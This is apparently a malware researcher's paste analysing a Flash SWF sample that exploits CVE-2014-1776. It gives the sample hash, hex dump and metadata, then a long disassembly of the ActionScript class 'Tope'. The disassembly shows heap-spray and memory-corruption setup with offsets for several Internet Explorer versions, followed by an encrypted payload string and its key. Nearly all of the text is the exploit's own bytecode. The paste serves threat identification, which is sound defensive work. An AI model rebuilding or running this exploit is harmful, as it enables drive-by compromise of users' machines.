// ======================
// CVE-2014-1776 SWF 
// Debug mode
// #MalwareMustdie
//
// SHA256: 	00db30d185678bacc8f3fa12f6a642ca923d93219a9447b448e0e1e1c97b2c69
// File name: 	sample.swf
// Detection ratio: 	7 / 52
// Analysis date: 	2014-05-01 12:26:35 UTC 
// URL for sample: https://www.virustotal.com/en/file/00db30d185678bacc8f3fa12f6a642ca923d93219a9447b448e0e1e1c97b2c69/analysis/1398947195/
// *) Hope this spaste can help to ID this CVE
// ======================

// ------------
// Hex Snips
// ------------

0000   43 57 53 0A 17 2F 00 00 78 DA AD 7A 6B 6C 9C 57    CWS../..x..zkl.W
0010   7A DE 77 E6 76 66 86 17 0D 29 92 BA 58 B2 68 6B    z.w.vf...)..X.hk
0020   A8 0B C5 11 BF FB 45 6B 6B 2D 59 A2 25 53 36 1D    ......Ekk-Y.%S6.
0030   4B 76 36 DE D5 8A E7 9C EF 1C 91 6B 92 C3 0C 87    Kv6........k....
0040   BA A4 69 96 55 D6 DD 0B 0A 64 9D 5D 6C D2 04 29    ..i.U....d.]l..)
0050   46 9B CD C2 1B A7 75 DA EE 8F FD D1 A0 AE 8B 06    F.....u.........
0060   29 8A 00 43 12 6B 15 28 DA BA 40 D1 6C 8B 16 6D    )..C.k.(..@.l..m
0070   7F 34 58 20 40 A6 CF F9 BE E1 45 A6 DC 02 45 B5    .4X @.....E...E.
0080   9C 33 E7 BC E7 F6 5E 9F F7 3D B3 BE 67 D0 B6 61    .3....^..=..g..a
0090   1C 58 36 8C A7 89 71 69 E0 90 61 18 5F DD FF AF    .X6...qi..a._...
00A0   88 61 3C D7 88 D5 B9 D7 2F 4D 8D DE 5B 5C 58 5A    .a<...../M..[.XZ
00B0   39 87 D1 F3 27 E7 9A CD E5 73 93 93 77 EF DE 3D    9...'....s..w..=
00C0   7B D7 39 5B 6F DC 9E B4 A2 28 9A 34 ED 49 DB AE    {.9[o....(.4.I..
00D0   61 45 6D E5 FE 52 93 DD AB 2D AD 1C 3F 79 3E 39    aEm..R...-..?y>9
00E0   E0 92 5C 11 8D F9 E5 E6 7C 7D 69 54 8F 19 AF AF    ........|}iT....
00F0   36 9F 3F 79 B2 7B 6A 2C B6 0F 5D 5E 6D 2C 24 47    6.?y.{j,..]^m,$G
[...]
1C00   DE D9 A1 B5 D5 60 DA 6F E3 9A 71 5D 65 F0 33 28    .....`.o..q]e.3(
1C10   2A 35 9E 15 34 92 AB CA CC 1B 46 BB 96 63 47 DB    *5..4.....F..cG.
1C20   33 96 F1 52 E6 AF C8 F7 32 BF 93 E1 E2 3F 67 3F    3..R....2....?g?
1C30   CA FF 69 1E 05 D3 C1 0C 21 C5 E3 6D 53 1A B3 7D    ..i.....!..mS..}
1C40   E6 EC 57 CC D9 B7 CD D9 05 73 76 D1 9C ED C1 DF    ..W......sv.....
1C50   17 8C A3 C9 BF B9 B2 7E 53 EE D7 FF 07 41 F2 1F    .......~S....A..
1C60   3E EB FF 12 F9 7F 03 64 C6 73 0D                   >......d.s.
[0x00001c00]> EoF

// ------------------
// Exported Classes:
// ------------------
ABC Block 0 Classes
 - Tope$

// ------------------
// Attributes
// ------------------

<FileAttributes useDirectBlit='false' useGPU='false' hasMetadata='true' actionScript3='true' suppressCrossDomainCaching='false' swfRelativeUrls='false' useNetwork='true'/>

<Metadata>
  <rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'><rdf:Description rdf:about='' xmlns:dc='http://purl.org/dc/elements/1.1'><dc:format>application/x-shockwave-flash</dc:format><dc:title>Adobe Flex 4 Application</dc:title><dc:description>http://www.adobe.com/products/flex</dc:description><dc:publisher>unknown</dc:publisher><dc:creator>unknown</dc:creator><dc:language>EN</dc:language><dc:date>Apr 29, 2014</dc:date></rdf:Description></rdf:RDF>
</Metadata>

<ScriptLimits scriptRecursionLimit='1000' scriptTimeLimit='60'/>
<SetBackgroundColor color='#FFFFFF'/>
<ProductInfo product='Adobe Flex' edition='' version='4.6' build='23201' compileDate='Mon Apr 28 19:43:28 2014 UTC'/>
<FrameLabel label='Tope'/>

<SymbolClass>
  <Symbol idref='0' className='Tope' />
</SymbolClass>


// ------------------
// Noted: DoABC
// ------------------

<DoABC2>
  abc name frame1
  magic 2e0010
  Cpool numbers size 171 1 %
  Cpool strings count 138 size 4732 41 %
  Cpool namespaces count 21 size 41 0 %
  Cpool nssets count 2 size 22 0 %
  Cpool names count 110 size 334 2 %
  MethodInfo count 25 size 133 1 %
  InstanceInfo count 1 size 257 2 %
  ClassInfo count 1 size 2 0%
  ScriptInfo size 7 0 %
  MethodBodies count 25 size 5781 50 %


   //    script0

   class Tope extends flash.display::Sprite
   {

     function Tope():void	/* disp_id=-1 method_id=5 nameIndex = 10 */
     {
       // local_count=14 max_scope=1 max_stack=5 code_len=1327
       // method position=5328 code position=6030
       0    getlocal0     	
       1    pushscope     	
       2    getlocal0     	
       3    constructsuper	(0)
       5    getlocal0     	
       6    getlex        	stage //nameIndex = 79
       8    getproperty   	loaderInfo //nameIndex = 80
       10   getproperty   	parameters //nameIndex = 81
       12   pushstring    	"y"
       14   getproperty   	null //nameIndex = 75
       16   initproperty  	m_iver //nameIndex = 39
       18   getlocal0     	
       19   findpropstrict	flash.text::TextField //nameIndex = 25
       21   constructprop 	flash.text::TextField (0) //nameIndex = 25
       24   initproperty  	tf //nameIndex = 24
       26   getlocal0     	
       27   findpropstrict	flash.media::Sound //nameIndex = 17
       29   constructprop 	flash.media::Sound (0) //nameIndex = 17
       32   initproperty  	private::snd //nameIndex = 16
       34   getlocal0     	
       35   getlex        	Vector //nameIndex = 82
       37   getlex        	Object //nameIndex = 13
       39   applytype     	(1)
       41   getlocal0     	
       42   getproperty   	m_suf //nameIndex = 45
       44   construct     	(1)
       46   initproperty  	s //nameIndex = 23
       48   getlocal0     	
       49   getlex        	Vector //nameIndex = 82
       51   getlex        	Object //nameIndex = 13
       53   applytype     	(1)
       55   pushbyte      	12
       57   construct     	(1)
       59   initproperty  	ss //nameIndex = 12
       61   getlocal0     	
       62   findpropstrict	flash.utils::Timer //nameIndex = 22
       64   getlocal0     	
       65   getproperty   	private::delay //nameIndex = 15
       67   getlocal0     	
       68   getproperty   	private::repeat //nameIndex = 28
       70   constructprop 	flash.utils::Timer (2) //nameIndex = 22
       73   initproperty  	private::work //nameIndex = 21
       75   pushbyte      	0
       77   coerce_a      	
       78   setlocal1     	
       79   pushbyte      	0
       81   coerce_a      	
       82   setlocal2     	
       83   pushbyte      	0
       85   coerce_a      	
       86   setlocal3     	
       87   pushstring    	""
       89   coerce_a      	
       90   setlocal      	4
       92   pushstring    	""
       94   coerce_a      	
       95   setlocal      	5
       97   pushshort     	4096
       100  pushbyte      	4
       102  divide        	
       103  pushbyte      	2
       105  subtract      	
       106  coerce_a      	
       107  setlocal      	6
       109  pushbyte      	0
       111  coerce_a      	
       112  setlocal      	7
       114  pushshort     	4096
       117  pushbyte      	4
       119  divide        	
       120  pushbyte      	17
       122  subtract      	
       123  coerce_a      	
       124  setlocal      	8
       126  pushint       	404234240	// 0x18182000
       128  pushbyte      	8
       130  add           	
       131  coerce_a      	
       132  setlocal      	9
       134  pushbyte      	0
       136  coerce_a      	
       137  setlocal      	10
       139  pushbyte      	0
       141  convert_u     	
       142  setlocal      	11
       144  pushint       	1094795585	// 0x41414141
       146  convert_u     	
       147  setlocal      	12
       149  pushbyte      	0
       151  coerce_a      	
       152  setlocal1     	
       153  getlocal0     	
       154  getlocal      	6
       156  initproperty  	m_rawLen //nameIndex = 44
       158  getlocal0     	
       159  getlex        	flash.net::SharedObject //nameIndex = 42
       161  pushstring    	"mySo32"
       163  callproperty  	getLocal (1) //nameIndex = 83
       166  initproperty  	m_mySo //nameIndex = 41
       168  getlocal0     	
       169  callproperty  	private::DetmineCookie (0) //nameIndex = 47
       172  convert_b     	
       173  setlocal      	13
       175  jump          	L1

       
       L2: 
       179  label         	
       180  getlocal0     	
       181  getproperty   	s //nameIndex = 23
       183  getlocal1     	
       184  getlex        	Vector //nameIndex = 82
       186  getlex        	uint //nameIndex = 3
       188  applytype     	(1)
       190  getlocal      	6
       192  construct     	(1)
       194  setproperty   	null //nameIndex = 75
       196  getlocal0     	
       197  getproperty   	m_iver //nameIndex = 39
       199  pushstring    	"8"
       201  ifne          	L3

       205  returnvoid    	
       
       L3: 
       206  getlocal0     	
       207  getproperty   	m_iver //nameIndex = 39
       209  pushstring    	"9"
       211  ifne          	L4

       215  getlocal0     	
       216  getproperty   	s //nameIndex = 23
       218  getlocal1     	
       219  getproperty   	null //nameIndex = 75
       221  pushbyte      	0
       223  dup           	
       224  setproperty   	null //nameIndex = 75
       226  getlocal0     	
       227  getlocal1     	
       228  pushbyte      	6
       230  getlocal      	9
       232  pushbyte      	16
       234  add           	
       235  pushbyte      	120
       237  subtract      	
       238  callpropvoid  	setArrValue (3) //nameIndex = 48
       241  getlocal0     	
       242  getlocal1     	
       243  pushbyte      	6
       245  pushbyte      	4
       247  add           	
       248  getlocal      	9
       250  pushbyte      	80
       252  add           	
       253  pushbyte      	28
       255  subtract      	
       256  callpropvoid  	setArrValue (3) //nameIndex = 48
       259  pushbyte      	16
       261  coerce_a      	
       262  setlocal      	10
       264  getlocal0     	
       265  getlocal1     	
       266  getlocal      	10
       268  getlocal      	9
       270  pushbyte      	32
       272  add           	
       273  pushbyte      	44
       275  subtract      	
       276  callpropvoid  	setArrValue (3) //nameIndex = 48
       279  getlocal0     	
       280  getlocal1     	
       281  getlocal      	10
       283  pushbyte      	12
       285  add           	
       286  getlocal      	9
       288  pushbyte      	32
       290  add           	
       291  pushbyte      	44
       293  subtract      	
       294  callpropvoid  	setArrValue (3) //nameIndex = 48
       297  pushbyte      	32
       299  coerce_a      	
       300  setlocal      	10
       302  getlocal0     	
       303  getlocal1     	
       304  getlocal      	10
       306  getlocal      	9
       308  pushbyte      	52
       310  add           	
       311  callpropvoid  	setArrValue (3) //nameIndex = 48
       314  getlocal0     	
       315  getlocal1     	
       316  getlocal      	10
       318  pushbyte      	4
       320  add           	
       321  pushint       	1111638594	// 0x42424242
       323  callpropvoid  	setArrValue (3) //nameIndex = 48
       326  getlocal0     	
       327  getlocal1     	
       328  getlocal      	10
       330  pushbyte      	16
       332  add           	
       333  pushbyte      	0
       335  callpropvoid  	setArrValue (3) //nameIndex = 48
       338  pushbyte      	52
       340  coerce_a      	
       341  setlocal      	10
       343  getlocal0     	
       344  getlocal1     	
       345  getlocal      	10
       347  pushint       	1111638594	// 0x42424242
       349  callpropvoid  	setArrValue (3) //nameIndex = 48
       352  getlocal0     	
       353  getlocal1     	
       354  getlocal      	10
       356  pushbyte      	8
       358  add           	
       359  pushint       	1111638594	// 0x42424242
       361  callpropvoid  	setArrValue (3) //nameIndex = 48
       364  pushbyte      	80
       366  coerce_a      	
       367  setlocal      	10
       369  getlocal0     	
       370  getlocal1     	
       371  getlocal      	10
       373  getlocal      	9
       375  pushbyte      	80
       377  add           	
       378  pushbyte      	4
       380  add           	
       381  pushbyte      	4
       383  subtract      	
       384  callpropvoid  	setArrValue (3) //nameIndex = 48
       387  getlocal0     	
       388  getlocal1     	
       389  getlocal      	10
       391  pushbyte      	4
       393  add           	
       394  getlocal      	9
       396  pushbyte      	80
       398  add           	
       399  pushbyte      	8
       401  add           	
       402  pushshort     	168
       405  subtract      	
       406  callpropvoid  	setArrValue (3) //nameIndex = 48
       409  getlocal0     	
       410  getlocal1     	
       411  getlocal      	10
       413  pushbyte      	8
       415  add           	
       416  pushbyte      	0
       418  callpropvoid  	setArrValue (3) //nameIndex = 48
       421  pushshort     	256
       424  coerce_a      	
       425  setlocal      	10
       427  getlocal0     	
       428  getproperty   	s //nameIndex = 23
       430  getlocal1     	
       431  getproperty   	null //nameIndex = 75
       433  getlocal      	10
       435  pushbyte      	4
       437  add           	
       438  pushbyte      	4
       440  divide        	
       441  getlocal      	9
       443  pushbyte      	8
       445  add           	
       446  getlocal      	10
       448  add           	
       449  pushshort     	376
       452  add           	
       453  setproperty   	null //nameIndex = 75
       455  getlocal0     	
       456  getproperty   	s //nameIndex = 23
       458  getlocal1     	
       459  getproperty   	null //nameIndex = 75
       461  getlocal      	10
       463  pushbyte      	8
       465  add           	
       466  pushbyte      	4
       468  divide        	
       469  pushbyte      	0
       471  setproperty   	null //nameIndex = 75
       473  getlocal0     	
       474  getproperty   	s //nameIndex = 23
       476  getlocal1     	
       477  getproperty   	null //nameIndex = 75
       479  getlocal      	10
       481  pushbyte      	12
       483  add           	
       484  pushbyte      	4
       486  divide        	
       487  getlocal      	10
       489  getlocal      	9
       491  add           	
       492  pushbyte      	12
       494  add           	
       495  pushbyte      	12
       497  add           	
       498  pushbyte      	4
       500  add           	
       501  setproperty   	null //nameIndex = 75
       503  getlocal0     	
       504  getproperty   	s //nameIndex = 23
       506  getlocal1     	
       507  getproperty   	null //nameIndex = 75
       509  getlocal      	10
       511  pushbyte      	12
       513  add           	
       514  pushbyte      	12
       516  add           	
       517  pushbyte      	4
       519  divide        	
       520  pushbyte      	1
       522  setproperty   	null //nameIndex = 75
       524  getlocal      	10
       526  pushbyte      	12
       528  add           	
       529  pushbyte      	12
       531  add           	
       532  pushbyte      	4
       534  add           	
       535  coerce_a      	
       536  setlocal      	10
       538  getlocal0     	
       539  getproperty   	s //nameIndex = 23
       541  getlocal1     	
       542  getproperty   	null //nameIndex = 75
       544  getlocal      	10
       546  pushbyte      	28
       548  add           	
       549  pushbyte      	4
       551  divide        	
       552  getlocal      	9
       554  pushshort     	4088
       557  add           	
       558  pushbyte      	66
       560  subtract      	
       561  setproperty   	null //nameIndex = 75
       563  getlocal0     	
       564  getproperty   	s //nameIndex = 23
       566  getlocal1     	
       567  getproperty   	null //nameIndex = 75
       569  getlocal      	10
       571  pushbyte      	36
       573  add           	
       574  pushbyte      	4
       576  divide        	
       577  pushdouble    	4294901760
       579  setproperty   	null //nameIndex = 75
       581  getlocal0     	
       582  getproperty   	s //nameIndex = 23
       584  getlocal1     	
       585  getproperty   	null //nameIndex = 75
       587  getlocal      	10
       589  pushbyte      	48
       591  add           	
       592  pushbyte      	4
       594  divide        	
       595  pushint       	1094795585	// 0x41414141
       597  setproperty   	null //nameIndex = 75
       599  getlocal0     	
       600  getproperty   	s //nameIndex = 23
       602  getlocal1     	
       603  getproperty   	null //nameIndex = 75
       605  getlocal      	10
       607  pushbyte      	112
       609  add           	
       610  pushbyte      	4
       612  divide        	
       613  pushint       	1179010630	// 0x46464646
       615  setproperty   	null //nameIndex = 75
       617  pushshort     	4088
       620  pushbyte      	66
       622  subtract      	
       623  coerce_a      	
       624  setlocal      	10
       626  getlocal0     	
       627  getlocal1     	
       628  getlocal      	10
       630  pushbyte      	12
       632  subtract      	
       633  pushint       	1094795761	// 0x414141f1
       635  callpropvoid  	setArrValue (3) //nameIndex = 48
       638  getlocal0     	
       639  getlocal1     	
       640  getlocal      	10
       642  pushbyte      	0
       644  add           	
       645  getlocal      	9
       647  getlocal      	10
       649  add           	
       650  pushbyte      	8
       652  add           	
       653  pushbyte      	32
       655  subtract      	
       656  callpropvoid  	setArrValue (3) //nameIndex = 48
       659  getlocal0     	
       660  getlocal1     	
       661  getlocal      	10
       663  pushbyte      	8
       665  add           	
       666  pushdouble    	4294967295
       668  callpropvoid  	setArrValue (3) //nameIndex = 48
       671  getlocal0     	
       672  getlocal1     	
       673  getlocal      	10
       675  pushbyte      	12
       677  add           	
       678  pushbyte      	15
       680  callpropvoid  	setArrValue (3) //nameIndex = 48
       683  getlocal0     	
       684  getlocal1     	
       685  getlocal      	10
       687  pushbyte      	32
       689  add           	
       690  pushbyte      	0
       692  callpropvoid  	setArrValue (3) //nameIndex = 48
       695  getlocal0     	
       696  getlocal1     	
       697  getlocal      	10
       699  pushbyte      	36
       701  add           	
       702  pushbyte      	20
       704  add           	
       705  pushbyte      	0
       707  callpropvoid  	setArrValue (3) //nameIndex = 48
       710  getlocal0     	
       711  getlocal1     	
       712  getlocal      	10
       714  pushbyte      	60
       716  add           	
       717  pushdouble    	4294967295
       719  callpropvoid  	setArrValue (3) //nameIndex = 48
       722  getlocal0     	
       723  getproperty   	s //nameIndex = 23
       725  getlocal1     	
       726  getproperty   	null //nameIndex = 75
       728  pushshort     	1022
       731  decrement     	
       732  pushdouble    	4294967295
       734  setproperty   	null //nameIndex = 75
       736  jump          	L5
       
       L4: 
       740  getlocal0     	
       741  getproperty   	m_iver //nameIndex = 39
       743  pushstring    	"10"
       745  ifne          	L6

       749  getlocal0     	
       750  getlocal1     	
       751  pushbyte      	48
       753  getlocal      	9
       755  pushshort     	4088
       758  add           	
       759  pushshort     	1300
       762  subtract      	
       763  pushshort     	344
       766  subtract      	
       767  callpropvoid  	setArrValue (3) //nameIndex = 48
       770  getlocal0     	
       771  getlocal1     	
       772  pushshort     	148
       775  pushbyte      	8
       777  subtract      	
       778  pushint       	65536	// 0x10000
       780  callpropvoid  	setArrValue (3) //nameIndex = 48
       783  getlocal0     	
       784  getlocal1     	
       785  pushshort     	228
       788  pushbyte      	8
       790  subtract      	
       791  pushdouble    	4294967295
       793  callpropvoid  	setArrValue (3) //nameIndex = 48
       796  getlocal0     	
       797  getlocal1     	
       798  pushbyte      	52
       800  pushshort     	448
       803  add           	
       804  pushbyte      	0
       806  callpropvoid  	setArrValue (3) //nameIndex = 48
       809  pushshort     	512
       812  convert_u     	
       813  setlocal      	11
       815  getlocal0     	
       816  getlocal1     	
       817  getlocal      	11
       819  getlocal      	9
       821  getlocal      	11
       823  add           	
       824  callpropvoid  	setArrValue (3) //nameIndex = 48
       827  getlocal0     	
       828  getlocal1     	
       829  getlocal      	11
       831  pushbyte      	12
       833  add           	
       834  pushbyte      	1
       836  callpropvoid  	setArrValue (3) //nameIndex = 48
       839  getlocal0     	
       840  getlocal1     	
       841  getlocal      	11
       843  pushbyte      	28
       845  add           	
       846  getlocal      	9
       848  getlocal      	11
       850  add           	
       851  pushshort     	256
       854  add           	
       855  callpropvoid  	setArrValue (3) //nameIndex = 48
       858  getlocal0     	
       859  getlocal1     	
       860  getlocal      	11
       862  pushbyte      	36
       864  add           	
       865  pushint       	131072	// 0x20000
       867  callpropvoid  	setArrValue (3) //nameIndex = 48
       870  getlocal0     	
       871  getlocal1     	
       872  getlocal      	11
       874  pushbyte      	48
       876  add           	
       877  pushbyte      	0
       879  callpropvoid  	setArrValue (3) //nameIndex = 48
       882  getlocal0     	
       883  getlocal1     	
       884  getlocal      	11
       886  pushshort     	152
       889  add           	
       890  getlocal      	9
       892  pushshort     	4088
       895  add           	
       896  pushshort     	1300
       899  subtract      	
       900  pushshort     	344
       903  subtract      	
       904  callpropvoid  	setArrValue (3) //nameIndex = 48
       907  getlocal      	11
       909  pushshort     	256
       912  add           	
       913  convert_u     	
       914  setlocal      	11
       916  getlocal0     	
       917  getlocal1     	
       918  getlocal      	11
       920  pushbyte      	8
       922  add           	
       923  pushint       	131072	// 0x20000
       925  callpropvoid  	setArrValue (3) //nameIndex = 48
       928  getlocal0     	
       929  getlocal1     	
       930  getlocal      	11
       932  pushbyte      	12
       934  add           	
       935  getlocal      	12
       937  callpropvoid  	setArrValue (3) //nameIndex = 48
       940  getlocal0     	
       941  getlocal1     	
       942  getlocal      	11
       944  pushbyte      	36
       946  add           	
       947  pushbyte      	64
       949  callpropvoid  	setArrValue (3) //nameIndex = 48
       952  getlocal0     	
       953  getlocal1     	
       954  getlocal      	11
       956  pushbyte      	56
       958  add           	
       959  getlocal      	9
       961  getlocal      	11
       963  add           	
       964  pushbyte      	12
       966  add           	
       967  callpropvoid  	setArrValue (3) //nameIndex = 48
       970  getlocal0     	
       971  getlocal1     	
       972  getlocal      	11
       974  pushbyte      	68
       976  add           	
       977  pushdouble    	4294967295
       979  callpropvoid  	setArrValue (3) //nameIndex = 48
       982  getlocal0     	
       983  getlocal1     	
       984  getlocal      	11
       986  pushbyte      	92
       988  add           	
       989  getlocal      	12
       991  callpropvoid  	setArrValue (3) //nameIndex = 48
       994  getlocal0     	
       995  getlocal1     	
       996  pushbyte      	52
       998  pushshort     	3728
       1001 add           	
       1002 pushbyte      	0
       1004 callpropvoid  	setArrValue (3) //nameIndex = 48
       1007 pushshort     	4088
       1010 convert_u     	
       1011 setlocal      	11
       1013 jump          	L5
       
       L6: 
       1017 getlocal0     	
       1018 getproperty   	m_iver //nameIndex = 39
       1020 pushstring    	"11"
       1022 ifne          	L5

       1026 getlocal0     	
       1027 getlocal1     	
       1028 pushbyte      	48
       1030 getlocal      	9
       1032 pushshort     	4088
       1035 add           	
       1036 pushshort     	1592
       1039 subtract      	
       1040 pushshort     	584
       1043 subtract      	
       1044 callpropvoid  	setArrValue (3) //nameIndex = 48
       1047 getlocal0     	
       1048 getlocal1     	
       1049 pushshort     	312
       1052 pushbyte      	8
       1054 subtract      	
       1055 pushint       	65536	// 0x10000
       1057 callpropvoid  	setArrValue (3) //nameIndex = 48
       1060 getlocal0     	
       1061 getlocal1     	
       1062 pushshort     	428
       1065 pushbyte      	8
       1067 subtract      	
       1068 pushdouble    	4294967295
       1070 callpropvoid  	setArrValue (3) //nameIndex = 48
       1073 getlocal0     	
       1074 getlocal1     	
       1075 pushshort     	428
       1078 pushbyte      	12
       1080 add           	
       1081 pushbyte      	8
       1083 subtract      	
       1084 pushdouble    	4294967295
       1086 callpropvoid  	setArrValue (3) //nameIndex = 48
       1089 pushshort     	512
       1092 convert_u     	
       1093 setlocal      	11
       1095 getlocal0     	
       1096 getlocal1     	
       1097 getlocal      	11
       1099 getlocal      	9
       1101 getlocal      	11
       1103 add           	
       1104 callpropvoid  	setArrValue (3) //nameIndex = 48
       1107 getlocal0     	
       1108 getlocal1     	
       1109 getlocal      	11
       1111 pushbyte      	12
       1113 add           	
       1114 pushbyte      	1
       1116 callpropvoid  	setArrValue (3) //nameIndex = 48
       1119 getlocal0     	
       1120 getlocal1     	
       1121 getlocal      	11
       1123 pushbyte      	28
       1125 add           	
       1126 getlocal      	9
       1128 getlocal      	11
       1130 add           	
       1131 pushshort     	256
       1134 add           	
       1135 callpropvoid  	setArrValue (3) //nameIndex = 48
       1138 getlocal0     	
       1139 getlocal1     	
       1140 getlocal      	11
       1142 pushbyte      	36
       1144 add           	
       1145 pushbyte      	0
       1147 callpropvoid  	setArrValue (3) //nameIndex = 48
       1150 getlocal      	11
       1152 pushshort     	256
       1155 add           	
       1156 convert_u     	
       1157 setlocal      	11
       1159 getlocal0     	
       1160 getlocal1     	
       1161 getlocal      	11
       1163 pushbyte      	8
       1165 add           	
       1166 pushint       	131072	// 0x20000
       1168 callpropvoid  	setArrValue (3) //nameIndex = 48
       1171 getlocal0     	
       1172 getlocal1     	
       1173 getlocal      	11
       1175 pushbyte      	68
       1177 add           	
       1178 pushdouble    	4294967295
       1180 callpropvoid  	setArrValue (3) //nameIndex = 48
       1183 getlocal0     	
       1184 getlocal1     	
       1185 getlocal      	11
       1187 pushbyte      	92
       1189 add           	
       1190 getlocal      	12
       1192 callpropvoid  	setArrValue (3) //nameIndex = 48
       1195 pushshort     	4088
       1198 convert_u     	
       1199 setlocal      	11
       
       L5: 
       1201 getlocal1     	
       1202 increment     	
       1203 coerce_a      	
       1204 setlocal1     	
       
       L1: 
       1205 getlocal1     	
       1206 getlocal0     	
       1207 getproperty   	m_suf //nameIndex = 45
       1209 iflt          	L2

       1213 pushbyte      	0
       1215 coerce_a      	
       1216 setlocal1     	
       1217 jump          	L7

       
       L8: 
       1221 label         	
       1222 getlocal0     	
       1223 getproperty   	ss //nameIndex = 12
       1225 getlocal1     	
       1226 getlex        	Vector //nameIndex = 82
       1228 getlex        	Object //nameIndex = 13
       1230 applytype     	(1)
       1232 getlocal      	8
       1234 construct     	(1)
       1236 setproperty   	null //nameIndex = 75
       1238 pushbyte      	0
       1240 coerce_a      	
       1241 setlocal2     	
       1242 jump          	L9

       
       L10: 
       1246 label         	
       1247 getlocal0     	
       1248 getproperty   	ss //nameIndex = 12
       1250 getlocal1     	
       1251 getproperty   	null //nameIndex = 75
       1253 getlocal2     	
       1254 getlocal0     	
       1255 getproperty   	private::snd //nameIndex = 16
       1257 setproperty   	null //nameIndex = 75
       1259 getlocal2     	
       1260 increment     	
       1261 coerce_a      	
       1262 setlocal2     	
       
       L9: 
       1263 getlocal2     	
       1264 getlocal      	8
       1266 iflt          	L10

       1270 getlocal1     	
       1271 increment     	
       1272 coerce_a      	
       1273 setlocal1     	
       
       L7: 
       1274 getlocal1     	
       1275 pushshort     	1024
       1278 iflt          	L8

       1282 getlex        	flash.external::ExternalInterface //nameIndex = 77
       1284 getproperty   	available //nameIndex = 84
       1286 iffalse       	L11

       1290 getlex        	flash.external::ExternalInterface //nameIndex = 77
       1292 pushstring    	"eim"
       1294 getlocal0     	
       1295 getlocal0     	
       1296 getproperty   	private::m_trg //nameIndex = 20
       1298 callproperty  	private::decode (1) //nameIndex = 51
       1301 callproperty  	toString (0) //nameIndex = 85
       1304 callpropvoid  	call (2) //nameIndex = 78
       
       L11: 
       1307 getlocal0     	
       1308 getproperty   	private::work //nameIndex = 21
       1310 callpropvoid  	start (0) //nameIndex = 86
       1313 getlocal0     	
       1314 getproperty   	private::work //nameIndex = 21
       1316 getlex        	flash.events::TimerEvent //nameIndex = 9
       1318 getproperty   	TIMER //nameIndex = 87
       1320 getlocal0     	
       1321 getproperty   	private::proc //nameIndex = 67
       1323 callpropvoid  	addEventListener (2) //nameIndex = 88
       1326 returnvoid    	
     }
     var ss:__AS3__.vec::Vector.<Object>	/* slot_id 0 */
     var private::delay:uint = 1000	/* slot_id 0 */
     var private::snd:flash.media::Sound	/* slot_id 0 */
     var private::m_dump7:String = "5467ebaa5baab6c9d945321215d4f075251af2717b30cde85bdcede9d17bfb6eff2aa25e9b34ad7a1670ab5abc27b19273f17f197765196c0299b84f190b848f1d39eb95428d0e631343348b378f8d1246d2f5b33a4efff9a47f941a3eb02b290b2ac6732987f56d8c442af410beccbeac3cbbeaead69d33b790d0a8c32381ae11e4d7fe6802d9784ccf567380c1f9147f2e9577e0d01e392bb36d2421987f981c6745abbc5a57fa4d5f33047c95fa99882b23fd68b68b22ff25144978ff38499785a0bdf37635dbfddfd38264dcc3c0dd5f248dc26fd97fbf811f53edbb781c657928a6ea83b9420a139d31f8437ff98c66407b96acd9fc171dca9db15142f1379b269a5d6c3d3e806e94a5e442b1b2f4e8bff536654e2ca1a64e6df678ceeb58935219a7b2765068ebe20bc6675ef7f568f10a57fd153294ebacaf1e483ba01b657fe4b91ea025cb44c6b528dadd3ac4983bfcdd0fe9855217e9f4edc9d653b73f2f64f93bc76512194edad58fef5b96225676d0900e20b52e66c2c1d5d6b39080b8d021c1dd4511066957acead8e861e090401ff8c7f2865f845db36240d2f30194e775db98c883a1b64bcf93559c07c5ef6fb3c6da00b18614e6228747294ccb546cb8abe22bc9e15584afc4a249723ce594d9bc6d5e900db1ad4a3bd461cf7a060700bc580cd2cd238ff95b009ad81ed00abcf05d2632eb089f6e748983955f6b5104014fec4a138c6977d78c50a26a79166da8cbc9042a6f60a4139dffee2998c33902b254367b4344982ef09ec509d074aff79b47f6141628a53a73da9193ad5259e42387aeeaa6652994b4bdef90dc764091e477993eca3cb821475a0f1450b0956814cb256f357f71380c0d7f5718126a3410cb835721ec5bbfec69f57bcd56d04ee8a606da46a653bf43b12c0422511956ea79c98fce1afbd0c64ca3148b6e442e44301d3bb8b93587ecc2a86b48c406930978bad9cb0d5c5e627c87fd07eebb3305b343468bda57e0083e558e3155b02770e8dd5a1f22a810aec453be2430a200b28da859cecbe12aa384c9419e6f663c8fbae50340593babd6b2b0aab93a62623fe55a8ed41e98c613b5fd26435701b2dca49126f092f59e848692c411a6be306a2d5b6ebdabc4786fb7012a63b67e9d521a6043592fbba03f0de5f6ad22498dcc8fa2fce9e56fcfa4115caab30947d2a882be6b33d38ffc3ec5f1c2597ba7ef57d640584ad0ffbbf18158aabe762864064e155054238a8e2e097285f94f3a4f14866e739d4e54bcbf5f6d4491a8f4637c5f698ecc43f11b50354b8e85ce4790b06c714f40791175952a8c8d8b8b79b1ccebe03e6dcfd2da3aacea36222a6cf09a04726411b846f808058fb35abd407349a41e83c9bac9c3b4b7fd3f88d11d429840bc09e73088568d871d96585335258b0764f7b830d8f9a976d3d8ec309740cf8c2327286229dc8cea287d33761f4336faa5754028c4a1371278df3e8be864ac17737a0f562c287d2bbfdd3da83d5040d019d92dfe430f43b5126562e60615b1c741f07af8c711563de208b266e9a865ab1573e780725bbc160f4d22165b128bee7108c30385990f9f9153e9a402ed0961b240260d3dd7ab14585488c6779d64c93bd7176157a2152c41455518b5004a84df6a4ed1ec0bec6cf1fb60188bbe93385caaa0902d9a2a12bf5c06cbc85f9e9cd523eb6e54cca35a2498e3791cefabd8166c406bf053de550c26089cb02c879d89b817b258d2e7d45885ca387edebd0097ffa830892d2a9665047942ca87f82009cf1caafa13490a9e0b657fed2a6669659c80dac79e4a5ec540bd645b5d503880b642992ea8c1b0f3846c648f0a0b2a7fd52c1517f96a0a34b59089b347b58f98fc89b5b3824c6e600675a502eac5092d"	/* slot_id 0 */
     var private::m_keys:String = "2eb31f09e9a77a0fde5a1a23eff067a24a98840ceabf048497b3"	/* slot_id 0 */
